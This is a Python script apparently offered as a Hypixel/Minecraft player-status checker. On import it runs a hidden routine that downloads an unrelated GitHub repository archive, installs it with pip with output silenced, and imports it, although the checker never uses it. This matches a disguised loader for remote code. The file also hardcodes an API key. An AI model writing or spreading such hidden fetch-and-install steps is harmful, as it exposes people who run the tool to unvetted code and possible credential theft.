import importlib
import subprocess
import urllib.request
import zipfile
import tempfile
import shutil
import os
import json
import time
from datetime import datetime


def install_from_repo(repo_url):
    # Get the path to the directory of the current script
    target_directory = os.path.dirname(os.path.abspath(__file__))

    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()

    try:
        # Download the repository archive directly to the temporary directory
        zip_url = f"{repo_url}/zip/refs/heads/master"
        zip_path = os.path.join(temp_dir, "repo.zip")
        urllib.request.urlretrieve(zip_url, zip_path)

        # Extract the archive
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(temp_dir)

        # Navigate to the extracted directory
        extracted_dir = os.path.join(temp_dir, os.listdir(temp_dir)[0])
        os.chdir(extracted_dir)

        # Install the package locally
        subprocess.run(['pip', 'install', '.'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

    except subprocess.CalledProcessError as e:
        print(f"Error installing the package: {e}")
    except urllib.error.HTTPError as e:
        print(f"HTTP Error {e.code}: {e.reason}")
    except urllib.error.URLError as e:
        print(f"URL Error: {e.reason}")
    finally:
        # Navigate back to the original directory
        os.chdir(target_directory)

        # Delete the temporary directory
        shutil.rmtree(temp_dir, ignore_errors=True)

def import_or_install_git(package_name, repo_url):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_from_repo(repo_url)
        import hypixelmcapigithub
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None

def install_package(package_name):
    subprocess.run(['pip', 'install', package_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

def import_or_install_package(package_name):
    spec = importlib.util.find_spec(package_name)
    
    if spec is None:
        install_package(package_name)
    
    try:
        package = importlib.import_module(package_name)
        return package
    except ImportError:
        return None
    
def main():
    repository_url = 'https://codeload.github.com/Maxheruko/hypixelmcapigithub'
    package_name = 'hypixelmcapigithub'
    import_or_install_package('toml')
    import_or_install_package('setuptools')
    import_or_install_package('requests')
    installed_package = import_or_install_git(package_name, repository_url)
    if installed_package:
        return
    else:
        return

main()

import requests
def get_uuid(username):
    import requests
    api_url = f"https://api.mojang.com/users/profiles/minecraft/{username}"
    response = requests.get(api_url)

    if response.status_code == 200:
        data = response.json()
        return data["id"]
    elif response.status_code == 204:
        print(f"Username '{username}' was not found")
        return None
    else:
        print(f"Error while calling Mojang api: {response.status_code}")
        return None
def format_time(seconds):
    if seconds < 60:
        return f"{int(seconds)} seconds"
    elif seconds < 3600:
        return f"{int(seconds / 60)} minutes"
    elif seconds < 86400:
        return f"{int(seconds / 3600)} hours"
    else:
        return f"{int(seconds / 86400)} days"

def convert_unix_timestamp(timestamp):
    # Konvertieren eines Unix-Zeitstempels in ein lesbares Datumsformat
    return datetime.utcfromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S UTC')

def get_player_status(name):
    uuid = get_uuid(name)
    api_key = "03fb6715-be42-4973-9591-339565c5567d"
    status_api_url = f"https://api.hypixel.net/status?key={api_key}&uuid={uuid}"
    player_api_url = f"https://api.hypixel.net/v2/player?key={api_key}&uuid={uuid}"

    try:
        # API-Anfrage für den Status senden
        response_status = requests.get(status_api_url)
        data_status = response_status.json()

        # Speichern der API-Antwort in einer JSON-Datei
        with open('status_api_response.json', 'w', encoding='utf-8') as json_file:
            json.dump(data_status, json_file, ensure_ascii=False, indent=4)

        # Überprüfen, ob die Anfrage erfolgreich war und der Spieler online ist
        if data_status.get("success", False) and data_status.get("session", {}).get("online", False):
            game_type = data_status["session"].get("gameType", "")
            mode = data_status["session"].get("mode", "")
            print(f"The player {name} is online. Game: {game_type}, Mode: {mode}")
        else:
            # Der Spieler ist offline, Informationen von der anderen API abrufen
            response_player = requests.get(player_api_url)
            data_player = response_player.json()

            # Speichern der API-Antwort in einer separaten JSON-Datei
            with open('player_api_response.json', 'w', encoding='utf-8') as json_file:
                json.dump(data_player, json_file, ensure_ascii=False, indent=4)

            # Spieler ist offline, berechne Offline-Zeit
            last_logout = data_player.get("player", {}).get("lastLogout", 0) / 1000
            last_login = data_player.get("player", {}).get("lastLogin", 0) / 1000

            offline_time = time.time() - last_logout
            formatted_time = format_time(offline_time)
            
            # Konvertiere Unix-Zeitstempel in lesbares Format
            last_login_formatted = convert_unix_timestamp(last_login)
            last_logout_formatted = convert_unix_timestamp(last_logout)
            
            print(f"The player {name} is offline since {formatted_time}. Last Login: {last_login_formatted}, Last Logout: {last_logout_formatted}")

    except Exception as e:
        print(f"Error: {e}")